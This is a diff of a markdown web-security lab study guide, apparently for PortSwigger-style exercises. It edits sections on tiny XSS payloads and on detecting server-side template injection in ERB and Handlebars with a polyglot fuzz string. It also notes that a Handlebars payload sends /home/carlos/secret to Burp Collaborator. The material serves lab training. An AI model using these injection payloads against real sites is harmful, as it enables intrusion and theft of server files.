@@ -345,7 +345,7 @@ I am unable to get a working cookie stealer payload for this vulnerable lab.....
 
 + [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
   
->When input field maximum length is at least 23 character in length then use this resource for **Tiny XSS Payloads**.  
+>When input field maximum length is at only 23 character in length then use this resource for **Tiny XSS Payloads**.  
 
 + [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)  
 
@@ -2510,8 +2510,10 @@ ${foobar}
 
 ### ERB  
 
->Identify ERB template.  
+>Identify ERB template in a `GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2` request that then reflects the message value in the response, `Unfortunately this product is out of stock`.  
+
 ```
+fuzzer${{<%[%'"}}%\<>
 <%= 7*7 %>
 ```  
 
@@ -2530,13 +2532,17 @@ ${foobar}
 
 ### Handlebars  
 
->Handlebars Template can be identified by injecting below set of characters and not encoding them into the ```/?message=``` parameter. [SSTIMAP](https://github.com/vladko312/SSTImap) was not able to identify this handlebars SSTI vulnerability.  
+>Handlebars Template can be identified by injecting below set of characters and not encoding them into the `GET /?message=Unfortunately this product is out of stock` parameter. [SSTIMAP](https://github.com/vladko312/SSTImap) was not able to identify this handlebars SSTI vulnerability.  
+
+Use fuzzer payload to produce error message that ***identify*** handlebars template engine.  
 
 ```
-${{<%[%'"}}%\,
+fuzzer${{<%[%'"}}%\,<>
 ```  
 
 ![identified-ssti-handlebars.png](images/identified-ssti-handlebars.png)  
+
+>[URL encoding](https://www.urlencoder.org/) the payload, it is not required to remove newline breaks or spaces. The payload will send the contents of ```/home /carlos/secret``` to Burp Collaborator.  
 
 ```
 wrtz{{#with "s" as |string|}}
@@ -2559,8 +2565,6 @@ wrtz{{#with "s" as |string|}}
     {{/with}}
 {{/with}}
 ```
-
->Before URL encoding the payload above, it is not required to remove newline breaks or spaces. The above payload will send the contents of ```/home /carlos/secret``` to Burp Collaborator.  
 
 ![Handlebars template](images/handlebars-template.png)  
 
